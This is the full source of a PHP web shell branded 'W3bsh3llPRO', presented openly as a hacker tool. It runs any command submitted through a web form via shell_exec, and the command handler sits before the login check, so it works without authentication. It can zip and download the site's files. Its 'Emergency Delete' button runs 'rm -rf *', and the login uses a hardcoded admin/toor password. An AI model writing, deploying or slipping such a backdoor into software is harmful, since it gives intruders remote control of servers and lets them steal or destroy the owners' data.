<?php
session_start();

function executeCommand($command) {
    $output = shell_exec($command . " 2>&1");
    return json_encode(["command" => $command, "output" => $output]);
}

if (isset($_GET['zip'])) {
    $zipFile = "files.zip";
    shell_exec("zip -r $zipFile *");
    header('Content-Type: application/zip');
    header('Content-Disposition: attachment; filename="' . $zipFile . '"');
    readfile($zipFile);
    exit();
}

if (isset($_GET['download'])) {
    $file = basename($_GET['download']);
    if (file_exists($file)) {
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . $file . '"');
        readfile($file);
        exit();
    } else {
        die("File not found");
    }
}

$users = ["admin" => hash("sha256", "toor")];

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (isset($_POST['login'])) {
        $user = $_POST['username'];
        $pass = hash("sha256", $_POST['password']);
        
        if (isset($users[$user]) && $users[$user] === $pass) {
            $_SESSION['user'] = $user;
            header("Location: index.php");
            exit();
        } else {
            echo json_encode(["error" => "Invalid credentials"]);
            exit();
        }
    }
    
    if (isset($_POST['command'])) {
        echo executeCommand($_POST['command']);
        exit();
    }
}

if (!isset($_SESSION['user'])) {
    echo '<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>W3bsh3llPRO - Login</title>
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css">
    <style>
        body { background-color: black; color: green; text-align: center; }
        .login-container { margin-top: 100px; max-width: 300px; background: rgba(0, 0, 0, 0.8); padding: 20px; border-radius: 10px; }
    </style>
</head>
<body>
    <div class="container login-container">
        <h2>W3bsh3llPRO</h2>
        <form method="POST">
            <input class="form-control mb-2" type="text" name="username" placeholder="Username" required>
            <input class="form-control mb-2" type="password" name="password" placeholder="Password" required>
            <button class="btn btn-success w-100" type="submit" name="login">Login</button>
        </form>
    </div>
</body>
</html>';
    exit();
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>W3bsh3llPRO</title>
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css">
    <style>
        body { background-color: black; color: green; text-align: center; }
        .terminal { background: rgba(0, 0, 0, 0.8); padding: 20px; border-radius: 10px; }
        pre { text-align: left; color: lightgreen; height: 400px; overflow-y: scroll; padding: 10px; }
        .command-buttons { margin-top: 20px; }
        footer { margin-top: 20px; color: gray; }
    </style>
</head>
<body>
    <div class="container mt-5">
        <h1>W3bsh3llPRO</h1>
        <div class="terminal mt-3">
            <div class="command-buttons">
                <button class="btn btn-outline-success" onclick="executeCommand('ls -la')">List Files</button>
                <button class="btn btn-outline-success" onclick="executeCommand('whoami')">Who Am I</button>
                <button class="btn btn-outline-success" onclick="executeCommand('pwd')">Current Directory</button>
                <button class="btn btn-outline-danger" onclick="confirmEmergencyDelete()">Emergency Delete</button>
                <button class="btn btn-outline-warning" onclick="downloadZip()">Compress & Download ZIP</button>
                <button class="btn btn-outline-danger" onclick="clearHistory()">Clear History</button>
            </div>
            <form id="commandForm" class="mt-3">
                <input class="form-control mb-2" type="text" id="command" placeholder="Enter a command" required>
                <button class="btn btn-success w-100" type="submit">Execute</button>
            </form>
            <pre id="output"></pre>
        </div>
    </div>
    <footer>
        ©h3st4k3r
    </footer>
    <script>
        document.getElementById("commandForm").addEventListener("submit", function(event) {
            event.preventDefault();
            let command = document.getElementById("command").value;
            executeCommand(command);
        });

        function executeCommand(cmd) {
            fetch("index.php", {
                method: "POST",
                headers: { "Content-Type": "application/x-www-form-urlencoded" },
                body: "command=" + encodeURIComponent(cmd)
            })
            .then(response => response.json())
            .then(data => {
                let outputElement = document.getElementById("output");
                outputElement.textContent += "\n$ " + data.command + "\n" + data.output;
                outputElement.scrollTop = outputElement.scrollHeight;
            });
        }

        function confirmEmergencyDelete() {
            if (confirm("Warning: You are about to delete the shell and all files in its directory! This action is irreversible.")) {
                executeCommand("rm -rf *");
            }
        }

        function clearHistory() {
            document.getElementById("output").textContent = "";
        }

        function downloadZip() {
            window.location.href = "?zip=true";
        }
    </script>
</body>
</html>
